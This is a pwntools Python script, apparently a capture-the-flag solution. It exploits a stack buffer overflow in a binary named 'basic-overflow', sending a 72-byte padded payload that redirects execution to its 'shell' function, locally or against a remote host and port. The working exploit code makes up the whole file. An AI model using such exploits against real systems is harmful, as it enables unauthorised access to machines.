#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './basic-overflow'
elf = context.binary = ELF(exe, checksec=False)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.123.15.202', 5000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    offset = 72
    payload = flat({
        offset: [
            elf.symbols['shell']
        ]
    })

    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()